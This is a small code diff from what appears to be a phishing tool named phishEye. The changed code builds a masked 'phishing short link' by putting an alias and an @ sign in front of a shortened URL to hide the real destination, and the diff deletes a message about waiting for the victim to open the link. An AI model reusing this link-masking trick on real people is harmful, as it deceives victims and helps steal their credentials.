@@ -105,7 +105,6 @@ try:
             x = requests.get(shortner)
             r = x.text
          print(" [ * ] Phishing short link: "+alias+"@"+r.replace("\n","").replace("https://",""))
-         print('\n [ * ] Waiting for victim to open the link...')
       except:
          if(is_connected()):
             print(" [ ! ] Short url error!!!\n [ ! ] Please make an issue on github (https://github.com/sky9262/phishEye)")  
